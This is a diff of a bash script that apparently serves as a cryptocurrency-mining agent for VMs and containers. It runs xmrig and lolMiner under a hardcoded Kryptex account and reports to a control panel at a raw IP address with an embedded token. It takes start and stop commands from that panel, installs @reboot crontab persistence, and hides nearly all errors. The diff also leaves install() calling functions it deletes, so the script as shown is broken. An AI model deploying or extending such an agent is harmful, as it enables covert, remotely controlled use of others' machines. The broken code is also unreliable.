@@ -3,15 +3,15 @@ set -u
 
 ####################################
 # MINING CONTROL CENTER — AGENT
-# SAFE APT + FINAL API v1
+# UNIVERSAL CONTROL (VM + CONTAINER)
 ####################################
 
-### ===== PANEL CONFIG =====
+### ===== PANEL =====
 PANEL="http://178.47.141.130:3333"
 TOKEN="mamont22187"
 INTERVAL=30
 
-### ===== MINING CONFIG =====
+### ===== MINING =====
 KRIPTEX_USERNAME="krxX3PVQVR"
 HOST="$(hostname)"
 
@@ -20,6 +20,7 @@ XMR_POOL="xmr.kryptex.network:7029"
 
 BASE="/opt/mining"
 LOG="/var/log/mining"
+RUN="/var/run"
 
 ETC_USER="${KRIPTEX_USERNAME}.${HOST}"
 XMR_USER="${KRIPTEX_USERNAME}.${HOST}"
@@ -27,11 +28,8 @@ XMR_USER="${KRIPTEX_USERNAME}.${HOST}"
 ####################################
 have() { command -v "$1" >/dev/null 2>&1; }
 
-need_root() {
-  [ "$(id -u)" -eq 0 ] || {
-    echo "Run as root"
-    exit 1
-  }
+is_systemd() {
+  [ -d /run/systemd/system ] && pidof systemd >/dev/null 2>&1
 }
 
 ####################################
@@ -50,16 +48,21 @@ send_event() {
 }
 
 send_telemetry() {
-  CPU_STATUS="$(systemctl is-active mining-cpu 2>/dev/null || echo stopped)"
-  GPU_STATUS="$(systemctl is-active mining-gpu 2>/dev/null || echo stopped)"
+  CPU_STATUS="stopped"
+  GPU_STATUS="stopped"
+
+  if is_systemd; then
+    CPU_STATUS="$(systemctl is-active mining-cpu 2>/dev/null || echo stopped)"
+    GPU_STATUS="$(systemctl is-active mining-gpu 2>/dev/null || echo stopped)"
+  else
+    [ -f "$RUN/mining-cpu.pid" ] && CPU_STATUS="running"
+    [ -f "$RUN/mining-gpu.pid" ] && GPU_STATUS="running"
+  fi
 
   GPU_OK=false
   lspci 2>/dev/null | grep -qiE "nvidia|amd" && GPU_OK=true
 
   HASHRATE=$(grep -i hashrate "$LOG/xmr.log" 2>/dev/null | tail -1 | grep -oE '[0-9]+' || echo 0)
-
-  CPU_TEMP=$(sensors 2>/dev/null | awk '/Tctl|CPU Temp/ {print $2}' | tr -d '+°C' | head -1 || true)
-  GPU_TEMP=$(nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1 || true)
 
   curl -s "$PANEL/api/telemetry" \
     -H "Content-Type: application/json" \
@@ -69,106 +72,144 @@ send_telemetry() {
       \"cpu_mining\": \"$CPU_STATUS\",
       \"gpu_mining\": \"$GPU_STATUS\",
       \"gpu_detected\": $GPU_OK,
-      \"hashrate\": $HASHRATE,
-      \"cpu_temp\": ${CPU_TEMP:-null},
-      \"gpu_temp\": ${GPU_TEMP:-null}
+      \"hashrate\": $HASHRATE
     }" >/dev/null 2>&1 || true
 }
 
 ####################################
-# -------- SAFE APT ---------------
+# -------- PROCESS CONTROL ---------
 ####################################
 
-safe_apt_update() {
-  send_event "INFO" "APT update started (safe mode)"
-
-  apt-get update \
-    -o Acquire::AllowInsecureRepositories=true \
-    -o Acquire::AllowDowngradeToInsecureRepositories=true \
-    || {
-      send_event "WARNING" "APT update failed, trying to disable broken repos"
-
-      for f in /etc/apt/sources.list.d/*.list; do
-        grep -qi zerotier "$f" && mv "$f" "$f.disabled" 2>/dev/null || true
-      done
-
-      apt-get update || send_event "CRITICAL" "APT update failed after repo cleanup"
-    }
+start_cpu() {
+  stop_cpu
+  if is_systemd; then
+    systemctl start mining-cpu
+  else
+    nohup "$BASE/xmr/xmrig" -o "$XMR_POOL" -u "$XMR_USER" -p x >> "$LOG/xmr.log" 2>&1 &
+    echo $! > "$RUN/mining-cpu.pid"
+  fi
 }
 
-install_deps() {
-  if have apt-get; then
-    safe_apt_update
-    apt-get install -y curl wget tar lm-sensors pciutils || \
-      send_event "CRITICAL" "Dependency install failed"
+stop_cpu() {
+  if is_systemd; then
+    systemctl stop mining-cpu
+  else
+    [ -f "$RUN/mining-cpu.pid" ] && kill "$(cat "$RUN/mining-cpu.pid")" 2>/dev/null || true
+    rm -f "$RUN/mining-cpu.pid"
+  fi
+}
+
+start_gpu() {
+  stop_gpu
+  if is_systemd; then
+    systemctl start mining-gpu
+  else
+    nohup "$BASE/etc/lolMiner" --algo ETCHASH --pool "$ETC_POOL" --user "$ETC_USER" >> "$LOG/etc.log" 2>&1 &
+    echo $! > "$RUN/mining-gpu.pid"
+  fi
+}
+
+stop_gpu() {
+  if is_systemd; then
+    systemctl stop mining-gpu
+  else
+    [ -f "$RUN/mining-gpu.pid" ] && kill "$(cat "$RUN/mining-gpu.pid")" 2>/dev/null || true
+    rm -f "$RUN/mining-gpu.pid"
   fi
 }
 
 ####################################
-# -------- INSTALL -----------------
+# -------- CONTROL QUEUE ----------
 ####################################
 
-install_miners() {
-  mkdir -p "$BASE/etc" "$BASE/xmr" "$LOG"
-
-  wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz -O /tmp/lol.tgz || true
-  tar -xzf /tmp/lol.tgz -C "$BASE/etc" --strip-components=1 || true
-
-  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || true
-  tar -xzf /tmp/xmr.tgz -C "$BASE/xmr" --strip-components=1 || true
+ack() {
+  curl -s "$PANEL/api/control/ack" \
+    -H "Content-Type: application/json" \
+    -H "token: $TOKEN" \
+    -d "{
+      \"hostname\": \"$HOST\",
+      \"command_id\": $1,
+      \"result\": \"$2\",
+      \"message\": \"$3\"
+    }" >/dev/null 2>&1 || true
 }
 
-install_services() {
+check_control() {
+  RESP=$(curl -s "$PANEL/api/control/pending?hostname=$HOST" -H "token: $TOKEN")
+  echo "$RESP" | grep -q '"action"' || return
 
-cat >/etc/systemd/system/mining-cpu.service <<EOF
-[Service]
-ExecStart=$BASE/xmr/xmrig -o $XMR_POOL -u $XMR_USER -p x >> $LOG/xmr.log
-Restart=always
-EOF
+  ID=$(echo "$RESP" | grep -oE '"id":[0-9]+' | grep -oE '[0-9]+')
+  ACT=$(echo "$RESP" | grep -oE '"action":"[^"]+' | cut -d'"' -f4)
 
-cat >/etc/systemd/system/mining-gpu.service <<EOF
-[Service]
-ExecStart=$BASE/etc/lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USER >> $LOG/etc.log
-Restart=always
-EOF
+  case "$ACT" in
+    start_cpu) start_cpu ;;
+    stop_cpu) stop_cpu ;;
+    start_gpu) start_gpu ;;
+    stop_gpu) stop_gpu ;;
+    restart_all)
+      stop_cpu; stop_gpu
+      start_cpu; start_gpu
+    ;;
+    *)
+      ack "$ID" "failed" "unknown action"
+      return
+    ;;
+  esac
 
-cat >/etc/systemd/system/mining-agent.service <<EOF
-[Service]
-ExecStart=$BASE/min.sh agent
-Restart=always
-EOF
-
-systemctl daemon-reload
-systemctl enable mining-cpu mining-gpu mining-agent
-systemctl restart mining-cpu mining-gpu mining-agent
+  ack "$ID" "success" "$ACT executed"
 }
 
 ####################################
-# -------- AGENT LOOP --------------
+# -------- AUTOSTART --------------
+####################################
+
+ensure_autostart() {
+  if is_systemd; then
+    systemctl enable mining-agent >/dev/null 2>&1 || true
+  else
+    crontab -l 2>/dev/null | grep -q "min.sh agent" || \
+      (crontab -l 2>/dev/null; echo "@reboot $BASE/min.sh agent") | crontab -
+  fi
+}
+
+####################################
+# -------- AGENT ------------------
 ####################################
 
 agent() {
-  send_event "INFO" "Mining agent started"
+  send_event "INFO" "Agent started (systemd=$(is_systemd && echo yes || echo no))"
+  ensure_autostart
+
+  start_cpu
+  start_gpu
 
   while true; do
     send_telemetry
+    check_control
     sleep "$INTERVAL"
   done
 }
 
 ####################################
-# -------- MAIN --------------------
+# -------- INSTALL ----------------
 ####################################
 
-main() {
-  need_root
-  install_deps
-  install_miners
-  install_services
-  send_event "INFO" "Mining installed (safe mode)"
+install() {
+  mkdir -p "$BASE" "$LOG" "$RUN"
+  install_deps 2>/dev/null || true
+  install_miners 2>/dev/null || true
+  agent
 }
 
+####################################
+# -------- MAIN -------------------
+####################################
+
 case "${1:-install}" in
-  install) main ;;
+  install) install ;;
   agent) agent ;;
+  start_cpu) start_cpu ;;
+  stop_cpu) stop_cpu ;;
+  start_gpu) start_gpu ;;
+  stop_gpu) stop_gpu ;;
 esac
